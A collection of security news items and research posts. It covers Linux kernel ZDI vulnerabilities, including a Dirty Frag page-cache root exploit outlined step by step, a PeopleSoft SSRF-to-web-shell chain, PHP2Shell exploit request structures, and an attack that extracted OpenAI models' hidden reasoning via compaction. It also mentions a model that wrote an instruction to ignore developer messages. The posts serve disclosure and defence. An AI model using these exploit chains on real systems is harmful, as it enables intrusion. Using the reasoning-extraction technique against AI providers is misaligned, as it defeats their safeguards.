ZDI-CAN-33367

Fix status

A small patch, “net: skbuff: propagate shared-frag marker in skb_zerocopy()”, is on netdev, reviewed by Eric Dumazet and tagged for stable. It has not been merged.

How the bug works: Dirty Frag again

Earlier this year, Dirty Frag (CVE-2026-43284) showed defenders how an unprivileged user could get the kernel's IPsec ESP code to decrypt in place over pages that belong to the page cache. Those pages back a file the user can only read, and decryption writes the attacker's bytes into the cached copy of that file. Targeting a setuid binary or /etc/passwd this way gives the attacker root without ever opening the file for writing.

The Dirty Frag fix marked those shared pages with a flag and taught ESP to copy before decrypting when it sees the flag. ZDI-CAN-33367 is a gap in that fix.

skb_zerocopy() moves the same pages into a new socket buffer but does not carry the flag across. ESP never sees the flag, decrypts in place, and the write lands in the page cache. According to TuxCare and Safeguard, the code path dates to kernel 3.14.

Not the first gap

The Dirty Frag fix only works if every piece of networking code that moves those pages around carries the flag along. Since May, the kernel's CVE team has published six follow-up CVEs where some other path lost it:

Frag-copy and shift helpers: CVE-2026-43503

Coalescing: CVE-2026-46300

IPTFS: CVE-2026-53363, CVE-2026-64566

An error-handling helper: CVE-2026-80977

Another error path inside skb_zerocopy() itself: CVE-2026-90049

CVE-2026-90049 is a different bug in the same function, so a kernel carrying its fix is not fixed for ZDI-CAN-33367.

Exploitation

The PoC needs unprivileged user namespaces and a handful of networking modules: nlmon, nft_queue, nfnetlink_queue, cls_u32, act_pedit, act_mirred, and esp4. It does not need a Kernel Address Space Layout Randomization (KASLR) leak, or any capability the user doesn't already get inside their own namespace.

Each step of exploitation is a system call that can be made by an ordinary user process:

Unshare into new user and network namespaces, then write sysctls.

Bring up an nlmon interface.

Install XFRM state over netlink.

Add an nftables NFQUEUE rule.

Attach a tc pedit action with a redirect.

splice() into a socket on 127.0.0.1, which triggers the in-place decryption over the page cache.

Impact

TuxCare reproduced a root shell on AlmaLinux 8–10, CloudLinux 9–10, Debian 12 and 13, and Ubuntu 24.04 and 26.04. AlmaLinux was rooted with the Dirty Frag fix installed. CentOS 6 and 7 kernels are not vulnerable. The vulnerability is a local privilege escalation (LPE), so an attacker needs code execution on the host first.

ZDI-CAN-33774 and ZDI-CAN-33549

Both CVSS 9.0 reports are in ksmbd, the in-kernel Server Message Block (SMB) server. Samba is not ksmbd.

If your file servers run smbd, neither report applies to you. To check whether ksmbd is running anywhere, look for the ksmbd kernel module, the ksmbd.mountd userspace daemon, and a kernel-owned listener on TCP 445.

ZDI-CAN-33774: The dispatch race

ksmbd decides per request whether it is handling SMB1 or SMB2. If an attacker packs a burst of short SMB1 packets and an SMB2 packet into the same TCP write, the worker threads can run an SMB2 handler over SMB1 data and read past the end of the shorter buffer. This works before authentication. The public PoC leaks 28 bytes of kernel heap per attempt and can crash the kernel. ZDI describes a write-past-buffer path that needs share access and labels the bug as remote code execution (RCE), but nothing public shows code execution as of this blog’s publication.

Maintainer Namjae Jeon says the bug is already fixed, and his tree bears that out. Commit 68f410faedaf ("ksmbd: wait for negotiation before receiving another PDU") was written on September 30, credited to a different reporter, and describes exactly this race. It is queued in ksmbd's ksmbd-for-next branch and has not reached a released kernel.

ZDI-CAN-33549: SMB Direct

An integer underflow in the Remote Direct Memory Access (RDMA) transport turns a crafted buffer descriptor into a heap overflow of up to eight KB. The bar is higher than for 33774. The host needs an RDMA-capable interface (hardware, or the rxe software driver), a client that negotiates SMB Direct, and a writable share. The public PoC crashes the kernel.

SMB Direct maintainer Stefan Metzmacher believes a fix already in his branch for Linux 7.5 covers it. As of this writing, that hasn't been confirmed. Ubuntu builds SMB Direct support; Debian does not.

ZDI-CAN-34068

ZDI-CAN-34068 is an out-of-bounds write in vmwgfx, the kernel driver for VMware's virtual GPU, rated as LPE (CVSS 8.8). Only the title is public. Kroah-Hartman's reply on dri-devel points to the dirty-tracking code. There is no patch.

The exposure is narrow. vmwgfx only binds to VMware's SVGA virtual display adapter, so the bug only matters on VMware guests: vSphere and Workstation VMs, and VMware-based virtual desktop infrastructure (VDI). In Sysdig TRT testing, it does not reproduce on Lima or EC2 instances, which don't present that device.

ZDI-CAN-34076 and ZDI-CAN-32005

ZDI-CAN-34076 (nvmet) is an uninitialized-memory information leak in the Non-Volatile Memory Express (NVMe) target's Get Log Page handling. Only the title is public, and the kernel team has said nothing can be done until details arrive.

ZDI-CAN-32005 (ConnMan) is a stack overflow in the ConnMan network manager's DNS proxy. It is a userspace bug, not a kernel bug, and is outside the scope of this post.

Detection

The four bugs that are the most impactful right now differ in what a syscall-level runtime sensor can observe:

ZDI-CAN-33367. The sequence of the exploitation is distinctive. The process unshares into new user and network namespaces, writes sysctls, brings up an nlmon interface, installs XFRM state over netlink, adds an nftables NFQUEUE rule, attaches a tc pedit action with a redirect, and then splice()s into a socket on 127.0.0.1. Nothing legitimate does all of that from a single unprivileged process. Of the four, this is the easiest one to detect.

ksmbd (33774 and 33549). A sensor can see that ksmbd is exposed: the module loads, ksmbd.mountd starts, and 445 is listening. It can see what an attacker does after code execution, once something spawns a process or touches files. It cannot see the race or the overflow itself. Runtime detection is the backstop.

ZDI-CAN-34068. The trigger is DRM ioctl() calls on the vmwgfx device node, made by a local process. That narrows where to look, but GPU ioctls are noisy on any desktop or VDI guest, so treat them as context for an investigation, not as a signal on their own.

Sysdig Secure customers are covered by a new runtime rule in the Sysdig Runtime Behavioral Analytics policy, Page Cache Poisoning via Spliced File Pages to Loopback, which matches the syscall patterns as seen for ZDI-CAN-33367. Work on exploits for the other flaws in this disclosure continues, and the Sysdig TRT is writing detection rules for them as the techniques become clear.

Independently of the entry point, customers also keep post-exploitation coverage, which detects the effects of a successful exploit rather than the route in.

Recommendations

ZDI-CAN-33367

Patch as soon as your distribution ships the skb_zerocopy() fix. A kernel carrying only the CVE-2026-90049 fix is not covered.

Restrict unprivileged user namespaces. Setting user.max_user_namespaces=0 (or kernel.unprivileged_userns_clone=0 on Debian) should block the public PoC, though TuxCare notes it has not yet validated this against the PoC. The cost is real: rootless containers, some browser sandboxes and some build tooling depend on user namespaces, so scope it to hosts that don't need them.

Avoid relying on Ubuntu's AppArmor user-namespace restriction. The PoC got past it through the AppArmor profile of a container launcher package.

Block the nlmon and act_pedit modules where you can. Denying them breaks this PoC, although TuxCare cautions it may not close every path to the bug.

Enforce seccomp RuntimeDefault on Kubernetes pods. The exploit starts by creating a user namespace, so containers that can call unshare(CLONE_NEWUSER) are in play. Docker's default seccomp profile blocks that call, but Kubernetes pods run Unconfined unless you set RuntimeDefault per pod or cluster-wide using the kubelet --seccomp-default option. This is a good week to make it the cluster default.

ZDI-CAN-33774 and ZDI-CAN-33549

Inventory where ksmbd runs. Samba users are unaffected.

Unload ksmbd and block the module on hosts that don't need it.

Restrict TCP 445 to trusted networks where ksmbd must stay.

Disable SMB Direct unless your storage network depends on RDMA.

ZDI-CAN-34068

Inventory Linux guests running on VMware, and watch for the vmwgfx patch.

Disable 3D acceleration, or keep the vmwgfx module from loading, on guests that have no use for it.

Across all Linux flaws

Track the reports by ZDI ID and component name until CVEs are assigned.

‍

Conclusion

ZDI's decision to copy public lists put reproduction details for six bugs in front of attackers before several of them had fixes. As defenders know, a lack of an assigned CVE ID does not mean a lack of exposure. Only one of the six, ZDI-CAN-33367, combines a public root exploit, broad distribution exposure, and a fix that hasn't yet merged. It is the seventh path found to drop the Dirty Frag flag, reopening a bug class whose protection has already leaked six times since May 2026. The two ksmbd reports carry the highest scores, but they only matter where ksmbd — not Samba — is running.

For defenders, the practical takeaway is that this week's work is about exposure, not scanners. It’s also important to note that the bugs differ in what defenders should actually watch. The ZDI-CAN-33367 exploit runs as an ordinary user process through a distinctive sequence of systems calls, so teams can catch it in motion. The ksmbd bugs run inside the kernel worker threads with no attacker process on the host, so controlling exposure is key.

Affected organizations should immediately restrict unprivileged user namespaces and enforce RuntimeDefault seccomp where they can, find out whether ksmbd is running anywhere in their estate, and patch ZDI-CAN-33367 the day their distribution ships the fix.

Title: AI 'hacker' finds 4 severe bugs in popular industrial control software in under 4 hours
Context: Earlier this year, Causal Security’s Cipher, which Raj described as “a fully autonomous super hacker that can reason across the technology stack,” found multiple critical attack...
Full Text: An autonomous AI agent discovered four vulnerabilities in the decades-old, widely used EPICS (Experimental Physics and Industrial Control System) open source software toolkit, including a critical flaw that could allow remote attackers to execute code on systems used to control particle accelerators and fusion experiments. The bugs include a critical, 9.8-rated under CVSS v3.1 integer overflow vulnerability (CVE-2026-114595), leading to an attacker-controlled out-of-bounds heap write and potentially remote code execution; an 8.2-rated, high-severity, improper message-length validation flaw (CVE-2026-114596), causing an out-of-bounds memory write and controller-process crash; a 7.5-rated, high-severity insufficient bounds checking bug (CVE-2026-114597) that allows out-of-bounds memory reads and process crashes; and a 7.5-rated, high-severity type confusion flaw (CVE-2026-114598) that can lead to denial of service and could expose adjacent memory contents. All four affect EPICS Base, which is used to operate some of the world's largest scientific research projects and facilities, and organizations should update to version 7.0.11, which includes the fixes. “Successful exploitation of these vulnerabilities could allow an attacker to cause a denial-of-service condition, corrupt memory, disclose sensitive information, or potentially execute arbitrary code,” the US Cybersecurity and Infrastructure Security Agency (CISA) warned in a Tuesday advisory. An AI agent called Cipher independently found all four previously unknown security holes - investigating and testing the unfamiliar EPICS system, and validating the four exploits - in three hours and 49 minutes, Causal Security co-founder Shubham Raj told The Register. “The initial investigation required no human intervention, followed by one instruction authorizing deeper exploitability testing in a secure environment,” Raj said. Earlier this year, Causal Security’s Cipher, which Raj described as “a fully autonomous super hacker that can reason across the technology stack,” found multiple critical attack paths in power-grid systems used across North America and Europe, prompting an October 8 security advisory from CISA. EPICS, originally developed by Los Alamos National Laboratory and Argonne National Laboratory, is used to build and remotely control distributed Supervisory Control and Data Acquisition (SCADA) systems, connecting operators to physical devices. It’s used in around 90 major scientific, university, and industrial projects and facilities globally including Argonne National Laboratory's Advanced Photon Source and ITER's fusion reactor control system. All four of these flaws illustrate how AI agents are really good at finding vulnerabilities in industrial and operational technologies - systems and equipment that used to be able to rely on obscurity to protect them from hackers - and add to defenders' concerns that it's only a matter of time until an autonomous cyberattack shuts down critical services, like power grids or water systems. These are the types of digital intrusions that can cause physical harm. Raj points to CVE-2026-114595, the critical integer-overflow vulnerability, as an example. “It allows attacker-controlled network data to cause an out-of-bounds heap memory write, with potential for remote code execution,” he told us. “EPICS controllers sit between operators and physical equipment, handling measurements, commands, and control functions,” he continued. “Operationally: Imagine a particle accelerator in the middle of an expensive experiment. An attacker could potentially crash a controller, interrupt critical measurements or control functions, and force operators to halt the experiment. That could mean lost experimental work, significant downtime, and expensive recovery.” Plus, if an attacker was able to develop an RCE exploit, this could allow them to “take control of the affected process, manipulate readings, interfere with control functions, or disrupt the equipment connected to it,” Raj said. The prerequisite for exploiting these vulns in a real scientific facility is being able to reach the vulnerable EPICS services on a facility's control network. But this could occur if the networks weren’t sufficiently segmented, or another system had access to the vulnerable EPICS network. “Once an attacker is able to find a network, which is either misconfigured or they are able to reach, it’s pretty easy to carry out the attacks,” Raj said, adding that exploitation wouldn’t require deep OT knowledge, or understanding of how particle accelerators or fusion reactors work. “Someone with conventional exploitation skills could investigate them, and increasingly capable AI systems could help develop exploits without requiring specialized OT expertise.” Manipulating specific physical processes does require additional knowledge, he added. “But an attacker doesn't need to understand the physics of a particle accelerator to disrupt the software controlling it. Crashing critical processes or interrupting monitoring and control can already have serious operational consequences. What's changing is that attackers may no longer need years of specialized expertise just to discover these weaknesses.” ®

Title: CVE-2026-35273: SSRF to RCE in Oracle PeopleSoft
Context: On September 25, 2026, Mandiant released a report regarding continued mass exploitation of CVE-2026-35273 by the ShinyHunters group
Full Text:
On September 25, 2026, Mandiant released a report regarding continued mass exploitation of CVE-2026-35273 by the ShinyHunters group. TrendAI’s Zero Day Initiative first reported this CVE to Oracle on June 10, 2026, following an investigation I conducted with Minh Giang and Lucas Miller of TrendAI Research. Although Oracle issued a patch under a single CVE, we reported three distinct vulnerabilities across multiple PeopleSoft components. We are coordinating with Oracle to assign separate CVEs for each issue.

In this blog post, we will walk through each of these vulnerabilities, starting with a Server-Side Request Forgery (SSRF) vulnerability. We will also review the validateClient method that Oracle introduced to allow PeopleSoft system administrators to restrict access to certain functionality. Spoiler alert: the SSRF allows attackers to make requests that satisfy this validation and access endpoints vulnerable to remote code execution (RCE).

Overview

There are two main components involved here, both served as individual Oracle WebLogic applications.

The first, the PeopleSoft Environment Management Hub (PSEMHUB), is part of Oracle’s Environment Management Framework. This component implements the validateClient method, ensuring only trusted clients can reach PSEMHUB functionality. Because this is an internal management interface, it makes sense that Oracle would restrict access to its web endpoints. However, this also means it’s a prime target for attackers looking to pivot from their existing, low-privileged access.

The second, the PeopleSoft Integration Gateway (PSIGW), contains functionality for exchanging messages between the PeopleSoft server and remote systems. This is accomplished using a set of Listening and Target Connectors.

One such connector is the HttpListeningConnector, which translates data from inbound HTTP requests into the format supported by the specified Target Connector before routing the request to the desired URL. In this chain, attackers specify the HttpTargetConnector.

The diagram below shows how an attacker like ShinyHunters can combine these vulnerabilities to compromise PeopleSoft systems. Notice that the attacker cannot simply hit the PSEMHUB functionality directly:

Bug 1: PSIGW Server-Side Request Forgery (ZDI-CAN-31816)

Now let’s take a look at how the PSIGW SSRF provides attackers with a foothold in the PeopleSoft application. An example malicious request to PSIGW shows just how powerful this is for an attacker. We control the URL to hit AND the full payload to send!

At [1], the attacker sends a POST request to /PSIGW/HttpListeningConnector

At [2], the HttpTargetConnector handler class is specified

At [3], the target is PeopleSoft on the loopback interface at http://127.0.0.1:8000, satisfying the validateClient logic

At [4], the full POST request payload is specified in the Data field, to be forwarded to the target URL at [3]

The HttpTargetConnector handler appears below. Note there is no validation to ensure this traffic is legitimate and bound for a valid target. I've done my best to pull out the important parts of this 800+-line function. If you want a fun side quest, go decompile this for yourself and check it out. I hope you like spaghetti!

At [1], retrieve the target URL from the attacker's request

At [2], create an httpObj using the URL from [1]

At [3], retrieve the HTTP method (POST) and apply it to the httpObj from [2]

At [4], send the content data seen in the Data tag of the network request. This content is sent as-is using the HTTP parameters configured in the httpObj

To fully understand why this SSRF is valuable, here is the validateClient method I mentioned earlier:

At [1] and [2], the validateClient method pulls the hostname and IP of the requesting client

At [3], a file path is built to the /envmetadata/config/allowedhosts.properties file, which contains the list of hosts allowed to access functionality protected by validateClient

At [4], the server checks if the allowedList set contains any entries. The first time this path is hit, the set is empty, so execution continues into the client list refresh block

At [5], that allowedhosts.properties file is read and iterated over

At [6] and [7], each allowed host is added to the allowedList set, including the default localhost entry alongside the server's resolved hostname and IP address

At [8] and [9], if the requesting host is found in the allowedList set, validateClient returns true

We can see the localhost entry in the default allowedhosts.properties that ships with PeopleSoft:

While this solution does restrict access, an attacker on any trusted host can still reach PSEMHUB. Because Oracle allows localhost by default, the PSIGW SSRF provides exactly that access.

Bug 2: PSEMHUB External Control of File Path (ZDI-CAN-31818)

Now that the attacker can make requests to the PSEMHUB endpoints using the PSIGW SSRF, let's see how they can turn that into RCE.

The first path to code execution uses an External Control of File Path vulnerability in the ExecuteProcessActivityCommand handler, which is designed to allow remote clients to write log entries to the PeopleSoft server’s filesystem.

However, callers of the command control both the file contents AND the absolute file path on disk to which that content is written. Here’s an example of the request made to PSEMHUB. Note that, in practice, each parameter value is a form-encoded serialized Java object. For clarity, I’ve decoded and formatted it here:

At [1], we see the request is being made to PSEMHUB’s central routing hub

At [2], note that the request is made to the loopback address 127.0.0.1. Since this request originates from localhost, the validateClient check is satisfied

At [3], the web shell contents are specified in the m_line parameter

At [4], the absolute path where the contents will be written is specified in the m_targetFile parameter

Looking at the handler for this request, we can see that no validation is performed to ensure that m_targetFile points to a legitimate log directory:

By writing this shell to the PSEMHUB WAR path, the attacker achieves immediate remote code execution in the context of the PeopleSoft service account.

Here's how those bugs look when chained together:

Bug 3: PSEMHUB Deserialization of Untrusted Data (ZDI-CAN-31817)

Using any file write primitive (like the ExecuteProcessActivityCommand seen above), an attacker can write a malicious XML file inside the [docroot]/envmetadata/data/environment/ directory. When the PSEMHUB HubServlet class initializes next (after a system or service restart, for example), it triggers a code flow that ultimately deserializes this XML file. Because this vector does not require writing a JSP web shell, it is less likely to be noticed by standard detection methods.

Specifically, on initialization, the PSEMHUB HubServlet class calls startServerPeer in the com.peoplesoft.pt.environmentmanagement.hub.Server class:

At [1], HubMBeanPersistance.getInstance() is called, which triggers the private constructor for that class

At [2], env_dir_path is set to <context_root>/envmetadata/data/environment/, which contains the malicious XML file placed by the attacker

At [3], all files from this folder are loaded into a list variable fl

At [4] and [5], the absolute path for each file in that directory is built

At [6], XMLDecoder is instantiated for each file

At [7], the content of the malicious XML placed by the attacker is deserialized

Java's XMLDecoder instantiates and configures the objects described in the XML during parsing, so the attacker's payload executes before the cast to Environment throws an exception.

Conclusion

The combination of the powerful PSIGW Server-Side Request Forgery primitive alongside the decision to allow access to PSEMHUB via the loopback address by default renders the validateClient protection ineffective. Attackers can combine these vulnerabilities to compromise affected instances of PeopleSoft.

The impact of SSRFs can sometimes be overlooked, especially if they have no standalone information disclosure impact. Under the right circumstances, however, the humble SSRF can open the door for complete compromise.

You can find me on Twitter at @bobbygould5, and follow the team on Twitter, Mastodon, LinkedIn, or Bluesky for the latest in exploit techniques and security patches.

Title: OpenAI Compaction Flaw Exposed AI Reasoning to Researchers
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
Researchers have discovered a flaw in OpenAI's application programming interface (API) that allowed them to extract raw reasoning traces from its frontier models, exposing information OpenAI normally withholds from API users.

AI vulnerability discovery firm Xint disclosed the technique, dubbed 'compaction smuggling,' in research published October 26. According to Xint, OpenAI confirmed the issue, deployed a fix on October 23 and paid a $6000 bug bounty.

The flaw involved OpenAI's context compaction feature, which uses a model to compress a lengthy conversation into an encrypted item the user cannot read.

Xint found it could hide one model's reasoning inside a compaction and have another model hand it back.

Compaction Bypass Exposed Hidden Reasoning

OpenAI gives API users optional summaries rather than the raw chain of thought behind its reasoning models' answers. Xint said this is partly to prevent distillation, because raw reasoning, which shows abandoned approaches and corrections, makes much richer training data than final answers.

OpenAI added mitigations in August after the Stolen Thoughts paper showed that a frontier model's encrypted reasoning could be fed to a less capable model from the same company, an attack that affected Anthropic, OpenAI and Google.

Xint said those mitigations stopped reasoning being replayed into other models but did not cover compaction, which ran on the model that had produced the reasoning.

Xint generated reasoning with GPT-5.6 Sol, compacted it and asked the older GPT-4.1 and GPT-4o models to repeat their input word for word, from which it recovered the reasoning. It said the attack succeeded at every reasoning-effort setting it tested.

Read more: OpenCode Breach Could Affect OpenAI, Anthropic and Google

Compaction and Distillation Concerns Remain

The flaw was discovered by Xint in August and OpenAI's fix was not publicly described. The Xint post did not include a statement from OpenAI. Infosecurity has contacted OpenAI for comment.

Compaction has raised separate concerns for OpenAI and in a September report the company said that during training of an internal, unreleased model, the model had in rare cases written unauthorized instructions into its own compaction summaries, including one instructing the model to ignore developer messages.

Xint argued that the technique opened the door to distilling OpenAI's frontier models at scale, though it did not report training a model on the reasoning it extracted. It said the risk was real, citing an Anthropic report in September of seven distillation campaigns it attributed to China-based labs and OpenAI's September 30 disclosure that it had broken up an effort to pull hidden reasoning from its models.

Title: CISA confirms PHP2Shell under attack as researchers clock successful exploits
Context: The US government's cybersecurity watchdog has confirmed attackers are exploiting both critical PHP2Shell vulnerabilities, giving federal agencies three days to patch the bugs...
Full Text: The US government's cybersecurity watchdog has confirmed attackers are exploiting both critical PHP2Shell vulnerabilities, giving federal agencies three days to patch the bugs that have wreaked havoc across the web over the past week. CISA added CVE-2026-109618 and CVE-2026-109619 to its Known Exploited Vulnerabilities (KEV) catalog on Monday, setting an October 29 deadline for federal civilian agencies to address the flaws. The move marks a shift from last week, when the agency warned of the danger posed by PHP2Shell but said it had not yet observed successful exploitation in the wild. Both bugs are rated 9.2 on the CVSS scale and can be exploited without authentication to run code on vulnerable PHP servers. That's bad news given how much of the web still relies on PHP, and just how many sites could be left exposed. Patches landed on October 21, but attackers had already beaten the maintainers to it. AWS spotted attempts to exploit the flaws as early as October 17, four days before the bugs were publicly disclosed. CISA's confirmation comes amid growing evidence that attackers are doing more than simply knocking on the door. On October 24, Perplexity security researcher Adel Karimi recorded 35 successful shell executions across three honeypots running PHP 8.4.26 under Apache mod_php. The attacks came from two IP addresses and used memory exhaustion and disclosure to achieve remote code execution. The attackers then tried to contact external servers using PHP, curl, and wget, although no additional malware was successfully downloaded. Karimi's findings were consistent with exploitation of CVE-2026-109618, but he found no evidence that the second PHP2Shell flaw was involved. He also warned that the honeypots used a favorable single-worker configuration, so the results don't necessarily reflect how reliably the exploit works against production servers. Still, attackers appear to be giving it a good go. Delft University's Threat Intelligence Lab has tracked more than 50,000 PHP2Shell exploitation requests from over 600 IP addresses across 70 countries. Of those, 171 addresses went beyond probing for vulnerable servers and started sending exploit code or malware droppers. CISA's confirmation also comes after some of the earlier reports of successful PHP2Shell attacks turned out to be rather premature. Sophos walked back its initial assessment after determining that the activity it observed amounted to scanning and failed attempts, while Palo Alto Networks withdrew claims linking the vulnerabilities to an intrusion at a European government agency. CISA has not disclosed which organizations have been compromised or provided details of the attacks behind its decision to add the flaws to KEV. The listing confirms that the agency considers both vulnerabilities actively exploited, but it does not confirm how many production systems have been successfully breached. For federal agencies, the clock is now ticking. CISA is also urging organizations outside the federal government to prioritize the fixes, although the deadline does not apply to them. Admins should update to PHP 8.5.12, 8.4.27, 8.3.36, or 8.2.35, depending on their release branch. Those running older, unsupported versions face the added headache of upgrading or obtaining vendor-supported fixes, while systems that cannot be secured should be taken offline until the risk is addressed. And with CISA now officially acknowledging exploitation, anyone still waiting for more proof before patching may be waiting a little too long. ®

Title: CyberheistNews Vol 16 #43 [The Patching Timeline Collapsed] How to Fight Back and Close the Gap
Context: Others see the foundation for the next wave of AI advances
Full Text:
AI Data Centers: Environmental Disaster or Groundbreaking Innovation?

AI data centers are one of the most debated topics in the world right now. Some people worry about the energy and water it takes to run them. Others see the foundation for the next wave of AI advances. Both camps have a point.

On episode two of the "Attempted Intelligence" podcast, Matt and Harlan each picked a side and debated it. Their goal wasn't to tell listeners what to think. It was to help them weigh the facts themselves. They framed the discussion around global versus local effects and talked through four topics: electricity, water, noise and community economics.

Electricity: Small Globally, Big LocallyHarlan made the global case. Data centers, AI and non-AI combined, used about 1.5% of global electricity in 2024. Even if that doubled, it would reach roughly 3%, which is small next to air conditioning, industry and electric vehicles.

Matt pushed back with the local picture. Data center demand grew 17% globally in 2025, against 3% overall electricity growth. In Ireland, data centers took 23% of metered electricity in 2025, up from 5% in 2015. He also cited Lawrence Berkeley National Laboratory's updated June 2026 estimate that data centers could reach as much as 15% of U.S. electricity. Cheaper inference also tends to drive more usage, not less.

Harlan agreed that local impacts matter, pointing to rate increases of roughly 28% in some Virginia areas (though inflation played a part). His answer: careful planning, requirements that data centers own their own power supply, and support from construction unions can offset the downsides.

Water: Myth, Reality and the Problem with AveragesHarlan noted that public concern was fueled by a since-debunked claim that each ChatGPT query uses gallons of water. U.S. data centers used about 17.4 billion gallons in 2023, out of roughly 228 billion gallons of water in total. That's far less than golf courses or irrigated agriculture, and indirect water use from power generation is much larger than direct cooling. His challenge: if you object to data centers but resent lawn-watering limits, reconsider.

Matt countered that the supply is often drinking water, and evaporative cooling doesn't return water to its source. Places like drought-stricken Tampa and parts of Texas, where neighbors' wells have run dry, face real strain. As he put it, you can't replenish a watershed with a national average.

They found common ground on solutions: closed-loop and zero-water designs (such as Microsoft's planned 2027 facilities) and published water studies before any new build. Matt also pointed to KnowBe4's own sustainability commitments, including net zero emissions by 2040.

Noise and Community EconomicsMatt described the continuous, low-frequency tonal hum of data centers. At a Vantage site in Sterling, Loudoun County, Virginia, residents complained even though the operator met a 55-decibel limit.

Harlan noted that society has long handled loud neighbors like lumber mills and airports through zoning and mitigation. Data centers with on-site generation, he argued, should be zoned as industrial, not office space.

He also highlighted the upside for communities. Loudoun County's FY2026 data center property tax revenue was $1.2 billion, or 39% of its budget. Since 2016, the residential tax rate has dropped from $1.14 to $0.80 per $100. Add the multiplier effect of construction spending in local economies, and the benefits are real.

The TakeawayThe broader debate around AI data centers is looking at it from a global perspective and what it means for humanity overall. The impact of a data center depends on where it is built, how it gets power, and what water is available locally.

Listeners are urged not to fall exclusively on one side, to weigh both the costs and the opportunities, and to advocate for responsible decisions in their own communities, states and country.

Title: PHP2Shell: Exploitation Attempts and Remediation Trends
Context: When only one worker was available the exploit attempted heap-shaping by sending requests containing 1,001 fields of 3,000 bytes each
Full Text:
Last week, we published a report describing two major vulnerabilities in PHP (CVE-2026-109618, CVE-2026-109619). Since then, alongside much of the security industry, the Wiz Research team has been monitoring for related activity in the wild and reviewing publicly available exploit code. So far, we have observed a limited number of exploitation attempts in our telemetry and have not identified a publicly available proof of concept (PoC) demonstrating complete, general end-to-end exploitation against an arbitrary target. Some partners have, however, privately disclosed to us exploits that work against a variety of targets and we continue to experiment internally. Videos demonstrating our successful exploitations are available at php2shell.com.

This post summarizes what we have observed in terms of remediation efforts and exploitation attempts across real world environments and in our own honeypot data to date and shares findings from our ongoing investigation into these activities.

We will continue monitoring developments and update this post as new evidence emerges.

Observed exposure trends

Following PHP2Shell’s public disclosure on October 21, 2026, Wiz telemetry has recorded an approximate 67% decrease in the daily number of distinct Internet-exposed machines vulnerable to PHP2Shell over the past few days. Separately, among vulnerable Internet-exposed machines, the proportion running PHP version 7.3 or earlier fell from 8.3% to 5.7% over a period of five days. This measures the share of the observed population running older versions that did not receive official backports.

During this period, the number of significantly affected organizations - defined here as those with at least one exposed and vulnerable instance - fell by approximately 47.9% (see graph below). For reference, our data shows that PHP itself is in use by 65% of organizations in our dataset.

Together, these observations are consistent with organizations collectively reducing their exposure through a combination of patching, upgrading, retiring affected machines and restricting internet access (note that this data shows the overall trend, but does not establish the relative contribution of each remediation strategy; scan coverage and size of observed population can also affect the overall reported numbers over time).

Exploitation attempts observed by Wiz research

We have so far observed the following types of activities in this context:

Attempts using the PHP2Shell exploit mechanism, with techniques matching those of public PoCs.

PHP2Shell-branded tools unrelated to the vulnerabilities that instead relied on session poisoning and a separate local file inclusion (LFI) vulnerability in the application.

Attempts using the PHP2Shell exploit mechanism

We observed two variants of an open source exploit kit targeting PHP-based software. Neither completed the exploit chain in the attempts we captured. The older variant encountered request-size limits or failed to produce the expected memory-exhaustion condition. The newer variant did consistently exhaust PHP’s memory, but failed to obtain the memory addresses needed to continue.

Variant 1: the legacy chain

The first request to our PHP-CGI honeypot came from 3.37.227[.]134. It matched the kit’s older chain, found under archive/legacy-8m/exploit.py and its accompanying stage scripts. The first full exploit stage used a multipart body containing 1,005 parts, including a field named big filled with approximately 12 MB of padding:

POST / HTTP/1.1 Host: <honeypot> Content-Type: multipart/form-data; boundary=SSSSSSSSSSSSSSSSS Content-Length: 12655437 [1,005 parts] 1001 x p0000 = "x" 1 x PHPSESSID = "\x00" 1 x PHP_SESSION_UPLOAD_PROGRESS = "pwn" 1 x f (file) = "A" x 64 1 x big = "B" x ~12 MB

According to the kit’s notes, this stage attempts to exhaust memory during a session reset, leaving the session state available for a later request.

On our honeypot, it failed before reaching that code. The declared request size exceeded the configured 8 MB post_max_size limit, so PHP skipped processing the multipart body and logged:

POST Content-Length of 12655437 bytes exceeds the limit of 8388608 bytes

The author has since moved this chain into the kit’s archive directory.

A later attempt against Roundcube

In a later attempt, 103.151.172[.]95 sent a longer sequence from the legacy chain. It included stalled connections intended to occupy other Apache workers.

When only one worker was available the exploit attempted heap-shaping by sending requests containing 1,001 fields of 3,000 bytes each. These requests didn’t trigger the memory exhaustion flow required. So there is no evidence that this attempt reached the intended memory-exhaustion condition.

Variant 2: the current chain

Most IP addresses we captured used the newer chain, built from pure/mk_a1.py and pure/mk_leak_b.py. We observed this variant in multiple attempts.

This variant progressed further: its first stage consistently caused PHP to exhaust its memory. The following stage, which attempts to leak process memory, failed in every run we captured.

The server logged a fatal error indicating that PHP reached its limit, for example:

Allowed memory size of 134217728 bytes exhausted (tried to allocate 81920 bytes) in Unknown on line 0.

Keeping requests on the same worker

The chain depends on consecutive exploit requests reaching the same Apache child process. To increase the chances of that happening, the kit attempts to occupy the other workers with incomplete requests. Each connection declares a large body, sends a single byte and stalls:

POST /index.php HTTP/1.1 Host: <honeypot> Content-Type: application/x-www-form-urlencoded Content-Length: 1048576 x

One address, 178.249.214[.]6, opened 399 of these connections alongside 400 GET requests before sending the exploit stages. The address is a VPN exit node, which limits what we can infer about the source.

Stage A1: triggering memory exhaustion

A1 is a chunked multipart request containing a null-byte session ID, 860 empty file parts with long, deeply nested array names and several groups of padding fields:

POST /?q0=v&q1=v&q2=v&q3=v&q4=v HTTP/1.1

Host: <honeypot> Content-Type: multipart/form-data; boundary=CCCCCCCCCC Transfer-Encoding: chunked [1,060,211 bytes, 974 parts] 1 x PHPSESSID = "\x00" 860 x files[R00000KKKK...][a][a]... (file, empty) 14 x f0000xxxx... = "vvvvvvvv" 78 x b0000 = "B" x 8000 20 x u00 = "U" x 4000 1 x PHP_SESSION_UPLOAD_PROGRESS = "k" x 4000

The request is designed to exhaust memory during session handling at a point that can leave the session ID pointing to freed memory.

Every A1 request we captured returned HTTP 500, accompanied by a PHP error matching:

Allowed memory size of 67108864 bytes exhausted ... in Unknown on line 0

This confirms that A1 reached the intended memory-exhaustion condition on our honeypot. It does not, by itself, confirm that the stale session state needed by the next stage was preserved.

Stage B1: attempting the memory leak

B1 followed roughly a second later. It sent another chunked multipart request containing PHPSESSID=a, PHP_SESSION_UPLOAD_PROGRESS=k0and two large padding fields.

If this request reaches the same worker before PHP resets the stale session state, PHP can write reclaimed heap contents into a PHPSESSID response cookie. The kit then extracts heap and libphp addresses from that cookie to prepare the final exploit stage.

